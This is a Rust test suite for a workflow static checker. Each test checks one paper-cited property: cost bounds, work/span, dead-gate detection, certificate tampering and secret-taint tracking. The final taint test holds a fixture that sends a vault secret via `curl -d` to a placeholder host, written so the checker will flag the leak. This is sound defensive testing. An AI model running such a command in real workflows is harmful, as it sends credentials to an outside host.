// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! RESEARCH CONFORMANCE — every arXiv-grounded claim in `check/`,
//! verified as an executable property (one test per CITATIONS.md
//! entry; the « did we actually implement the paper? » suite). Pure
//! public API — no spec fixtures, no sandbox concerns.
#![allow(clippy::expect_used, clippy::panic)]

use nika_check::{Bound, CheckReport, check};
use nika_schema::{FileId, ParseMode, parse};

fn run(yaml: &str) -> CheckReport {
    check(&parse(yaml, FileId::new(0), ParseMode::Strict).expect("parse"))
}

fn wf(tasks: &str) -> String {
    format!("nika: w\nmodel: anthropic/claude-sonnet-4-6\ntasks:\n{tasks}")
}

/// Evaluate a degree-1 bound at a concrete size assignment (every
/// parametric term instantiated at `n`).
fn eval_bound(b: &Bound, n: u64) -> u64 {
    b.constant + b.terms.iter().map(|t| t.coeff * n).sum::<u64>()
}

/// Hoffmann/Das/Weng 2016 (arXiv:1611.00692) — THE SUBSTITUTION LEMMA:
/// the parametric AARA bound, evaluated at a concrete collection size
/// n, equals the bound of the CONCRETIZED workflow (`for_each` literal
/// list of n elements). The polynomial is not decorative — it is the
/// exact family of concrete certificates.
#[test]
fn aara_substitution_lemma_holds() {
    let parametric = run(&wf(
        "  src:\n    exec: { command: [\"ls\"] }\n  fan:\n    with: { files: \"${{ tasks.src.output.files }}\" }\n    for_each: { items: \"${{ with.files }}\" }\n    retry: { max_attempts: 2 }\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 200 }\n",
    ));
    for n in [1usize, 2, 5, 9] {
        let items: Vec<String> = (0..n).map(|i| format!("\"f{i}\"")).collect();
        let concrete = run(&wf(&format!(
            "  src:\n    exec: {{ command: [\"ls\"] }}\n  fan:\n    after: {{ src: success }}\n    for_each: {{ items: [{}] }}\n    retry: {{ max_attempts: 2 }}\n    infer: {{ prompt: \"x ${{{{ item }}}}\", max_tokens: 200 }}\n",
            items.join(", ")
        )));
        let n64 = n as u64;
        assert_eq!(
            eval_bound(&parametric.certificate.task_attempts, n64),
            concrete.certificate.task_attempts.constant,
            "task-attempts substitution at n={n}"
        );
        assert_eq!(
            eval_bound(&parametric.certificate.llm_calls, n64),
            concrete.certificate.llm_calls.constant,
            "llm-calls substitution at n={n}"
        );
        let p_usd = parametric.certificate.usd_micros.as_ref().expect("priced");
        let c_usd = concrete.certificate.usd_micros.as_ref().expect("priced");
        assert_eq!(
            eval_bound(p_usd, n64),
            c_usd.constant,
            "spend substitution at n={n}"
        );
    }
}

/// Brent 1974 lineage · Tassarotti 2017 (arXiv:1704.02061) — the
/// work/span envelope: span ≤ work evaluated at n=1, span == work on
/// pure chains, span < work whenever parallelism exists.
#[test]
fn brent_envelope_span_versus_work() {
    // chain: span == work
    let chain = run(&wf(
        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    after: { a: success }\n    retry: { max_attempts: 4 }\n    exec: { command: [\"true\"] }\n",
    ));
    assert_eq!(chain.certificate.span_attempts, 5);
    assert_eq!(chain.certificate.task_attempts.constant, 5);

    // wide DAG: span < work (the parallelism IS the gap)
    let wide = run(&wf(
        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    after: { a: success }\n    exec: { command: [\"true\"] }\n  c:\n    after: { a: success }\n    exec: { command: [\"true\"] }\n  d:\n    after: { a: success }\n    exec: { command: [\"true\"] }\n",
    ));
    assert_eq!(wide.certificate.span_attempts, 2);
    assert_eq!(wide.certificate.task_attempts.constant, 4);

    // the general inequality over a family: span ≤ work@n=1
    for tasks in [
        "  a:\n    exec: { command: [\"true\"] }\n",
        "  a:\n    exec: { command: [\"true\"] }\n  b:\n    with: { xs: \"${{ tasks.a.output.xs }}\" }\n    for_each: { items: \"${{ with.xs }}\" }\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 10 }\n",
        "  a:\n    retry: { max_attempts: 3 }\n    exec: { command: [\"true\"] }\n  b:\n    after: { a: success }\n    exec: { command: [\"true\"] }\n  c:\n    after: { b: success }\n    retry: { max_attempts: 2 }\n    exec: { command: [\"true\"] }\n",
    ] {
        let r = run(&wf(tasks));
        assert!(
            r.certificate.span_attempts <= eval_bound(&r.certificate.task_attempts, 1),
            "Brent: span must never exceed work@n=1"
        );
    }
}

/// Prinz/Schwanen/van der Aalst 2026 (arXiv:2602.02447) + Blondin et
/// al. 2022 (arXiv:2201.05588) — reachability soundness, checked
/// against an INDEPENDENT brute-force oracle for the single-dep
/// `==`/`!=` fragment: a gate reported dead must be FALSE under every
/// status in the dep's possible set; a gate not reported dead must be
/// TRUE under at least one.
#[test]
fn reach_dead_claims_agree_with_a_brute_force_oracle() {
    // the dep `a` is a plain task: per the abstraction its possible
    // set is {success, failure, cancelled} (skipped needs a route)
    let possible = ["success", "failure", "cancelled"];
    let cases: [(&str, &str); 6] = [
        ("==", "'success'"),
        ("==", "'failure'"),
        ("==", "'skipped'"),
        ("==", "'cancelled'"),
        ("!=", "'success'"),
        ("!=", "'skipped'"),
    ];
    for (op, lit) in cases {
        let yaml = wf(&format!(
            "  a:\n    exec: {{ command: [\"true\"] }}\n  b:\n    with: {{ s: \"${{{{ tasks.a.status }}}}\" }}\n    when: ${{{{ with.s {op} {lit} }}}}\n    exec: {{ command: [\"true\"] }}\n",
        ));
        let r = run(&yaml);
        let engine_dead = r
            .gate_findings
            .iter()
            .any(|g| format!("{:?}", g.kind).contains("DeadTask"));
        // the independent oracle: evaluate the relation naively
        let lit_clean = lit.trim_matches('\'');
        let oracle_satisfiable = possible.iter().any(|s| match op {
            "==" => *s == lit_clean,
            _ => *s != lit_clean,
        });
        assert_eq!(
            engine_dead, !oracle_satisfiable,
            "oracle disagreement on `status {op} {lit}`"
        );
    }
}

/// Shokry et al. 2024 (arXiv:2412.06121) + Liu Yanglet et al. 2026
/// (arXiv:2605.24462) — the certifying-algorithm contract under FUZZED
/// tampering: 60 systematic single-field corruptions, every one
/// rejected by the independent checker; the honest certificate always
/// accepted.
#[test]
fn certifying_audit_rejects_every_systematic_tamper() {
    let yaml = wf(
        "  a:\n    retry: { max_attempts: 2 }\n    exec: { command: [\"true\"] }\n  fan:\n    with: { xs: \"${{ tasks.a.output.xs }}\" }\n    for_each: { items: \"${{ with.xs }}\" }\n    infer: { prompt: \"x ${{ item }}\", max_tokens: 100 }\n  save:\n    after: { fan: success }\n    invoke: { tool: \"nika:write\", args: { path: \"./o\", content: \"y\" } }\n",
    );
    let parsed = parse(&yaml, FileId::new(0), ParseMode::Strict).expect("parse");
    let honest = check(&parsed).certificate;
    assert!(honest.audit(&parsed).is_ok(), "honest must pass");

    let mut rejected = 0usize;
    let mut total = 0usize;
    // systematic tampers: bump every numeric surface by +1 / clear vecs
    for bump in [1u64, 7] {
        for field in 0..7 {
            let mut t = honest.clone();
            match field {
                0 => t.task_attempts.constant += bump,
                1 => t.llm_calls.constant += bump,
                2 => t.effect_calls.constant += bump,
                3 => t.span_attempts += bump,
                4 => {
                    if let Some(b) = t.usd_micros.as_mut() {
                        b.constant += bump;
                    }
                }
                5 => {
                    let i = usize::try_from(bump).expect("small") % t.derivation.len();
                    t.derivation[i].attempts += 1;
                }
                _ => {
                    let i = usize::try_from(bump).expect("small") % t.derivation.len();
                    t.derivation[i].deps.clear();
                }
            }
            total += 1;
            if t.audit(&parsed).is_err() {
                rejected += 1;
            }
        }
    }
    // row-count tampers
    for _ in 0..2 {
        let mut t = honest.clone();
        t.derivation.pop();
        total += 1;
        if t.audit(&parsed).is_err() {
            rejected += 1;
        }
    }
    assert_eq!(
        rejected, total,
        "every tamper must be rejected ({rejected}/{total})"
    );
}

/// Denning 1976 — IFC transitivity at depth: a secret flowing through
/// THREE `with:` aliases into an exec is still caught (the lattice is
/// transitive, not one-hop).
#[test]
fn denning_ifc_taint_is_transitive_at_depth() {
    let r = run(
        "nika: w\nmodel: anthropic/claude-sonnet-4-6\nsecrets:\n  k: { source: vault, key: x }\ntasks:\n  t1:\n    with: { a: \"${{ secrets.k }}\" }\n    exec: { shell: \"echo ${{ with.a }}\", capture: stdout }\n  t2:\n    with: { b: \"${{ tasks.t1.output }}\" }\n    exec: { shell: \"echo ${{ with.b }}\", capture: stdout }\n  t3:\n    with: { c: \"${{ tasks.t2.output }}\" }\n    exec: { command: [\"curl\", \"-d\", \"${{ with.c }}\", \"https://x.io\"] }\n",
    );
    assert!(
        !r.secret_leaks.is_empty(),
        "the 3-hop alias chain must be caught: {:?}",
        r.secret_leaks
    );
}
